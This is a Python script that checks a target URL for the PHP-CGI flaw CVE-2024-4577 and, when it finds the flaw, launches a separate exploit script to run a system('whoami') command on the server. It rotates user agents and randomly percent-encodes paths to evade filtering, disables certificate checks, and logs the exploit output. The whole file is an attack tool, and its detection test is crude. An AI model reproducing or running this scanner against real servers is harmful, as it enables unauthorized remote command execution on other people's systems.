#!/usr/bin/env python3

import asyncio
import aiohttp
import random
import json
import subprocess
from aiohttp import ClientSession

# Configuration
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "Mozilla/5.0 (X11; Linux x86_64)",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)",
    "Mozilla/5.0 (Android 11; Mobile; rv:90.0)"
]

OUTPUT_FILE = "CVE-2024-4577_scan_results.json"
SCAN_DELAY = (1, 5)
EXPLOIT_SCRIPT = "./CVE-2024-4577_exploit.py"
COMMAND = "system('whoami')"

def get_random_user_agent():
    return random.choice(USER_AGENTS)

def obfuscate_payload(payload):
    return ''.join(random.choice([c, f"%{hex(ord(c))[2:]}"]) for c in payload)

async def async_request(url, headers, payload, method="GET", timeout=10):
    async with aiohttp.ClientSession() as session:
        try:
            if method == "GET":
                async with session.get(url, headers=headers, timeout=timeout, ssl=False) as response:
                    return await response.text()
            elif method == "POST":
                async with session.post(url, headers=headers, data=payload, timeout=timeout, ssl=False) as response:
                    return await response.text()
        except Exception as e:
            print(f"[-] Error during async request: {e}")
            return ""

async def check_vulnerability(url):
    headers = {'User-Agent': get_random_user_agent()}
    payload = obfuscate_payload("/php-cgi/php-cgi.exe")
    response = await async_request(url + payload, headers, "", "GET")
    if "php-cgi" in response:
        print(f"[+] Vulnerability detected at {url}")
        return True
    return False

async def run_exploit(url):
    try:
        result = subprocess.run(
            ["python3", EXPLOIT_SCRIPT, url, COMMAND],
            capture_output=True,
            text=True
        )
        print(f"[*] Exploit result for {url}:\n{result.stdout}")
        return result.stdout
    except Exception as e:
        print(f"[-] Error running exploit on {url}: {e}")
    return ""

async def scan_target(url):
    if await check_vulnerability(url):
        exploit_output = await run_exploit(url)
        return {
            "url": url,
            "status": "vulnerable",
            "exploit_output": exploit_output
        }
    else:
        return {
            "url": url,
            "status": "not vulnerable"
        }

async def main():
    target = input("Enter the target URL (e.g., http://example.com): ").strip()
    if not target.startswith("http"):
        print("[-] Invalid target URL. Please use a valid format.")
        return

    result = await scan_target(target)
    with open(OUTPUT_FILE, "w") as outfile:
        json.dump(result, outfile, indent=4)
    print(f"[*] Scan complete. Results saved to {OUTPUT_FILE}")

if __name__ == "__main__":
    asyncio.run(main())
